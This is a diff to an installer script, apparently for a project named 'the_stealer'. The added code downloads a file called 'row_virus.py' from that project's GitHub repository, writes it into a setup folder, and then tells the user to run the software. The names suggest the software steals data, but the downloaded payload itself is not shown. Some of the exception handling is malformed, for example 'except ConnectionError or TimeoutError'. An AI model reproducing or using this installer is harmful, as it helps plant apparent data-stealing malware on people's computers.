@@ -38,6 +38,8 @@ try:import webbrowser
 except Exception as e:subprocess.call(['pip3','install','webbrowser'])
 try:import Crypto.Cipher
 except Exception as e:subprocess.call(['pip3','install','pycryptodome'])
+try:import requests
+except Exception as e:subprocess.call(['pip3','install','requests'])
 
 def create_path(path:str,check_file=False,json_file=False,content={"name":None}):
     '''Checks if the path exists and creates it if it doesn't.If check_file is True, checks for the existence of a file.'''
@@ -61,10 +63,36 @@ create_path(dev_resorse+'\\info_mv.json',check_file=True,json_file=True,content=
 create_path(info_resorse)
 try:
     shutil.move(current_directory+'\\row_virus.py',path_to_row_virus)
-except Exception:
+except FileNotFoundError:
+    while True:
+        try:
+            response=requests.get("https://raw.githubusercontent.com/Akkiraj1234/the_stealer/main/row_virus.py")
+            if response.status_code==200:
+                with open(path_to_row_virus+'row_virus.py','w+',encoding='UTF-8') as test:test.write(response.text)
+                break
+            else:
+                while True:
+                    if check_internet_connection():break
+                    else:time.sleep(5);print('conect the internet')
+        except ConnectionError or TimeoutError:
+            while True:
+                if check_internet_connection():break
+                else:print('Connect to the internet');time.sleep(5)
+        except requests.HTTPError or Exception as e:
+            print(f"HTTP error: {e}")
+            print('coude not move the folder to destination path move it manually')
+            print('file to move ',current_directory+'\\row_virus.py')
+            print('where to move ',path_to_row_virus)
+            break
+except PermissionError:
+    print("Permission denied when moving the file or writing to the destination folder.")
     print('coude not move the folder to destination path move it manually')
     print('file to move ',current_directory+'\\row_virus.py')
     print('where to move ',path_to_row_virus)
+    
+    
+
+
 print('you all done')
 print('for using the software just run main.py and software start woking')
 print('you can also delet the git clone version of the stealer its no longer use')
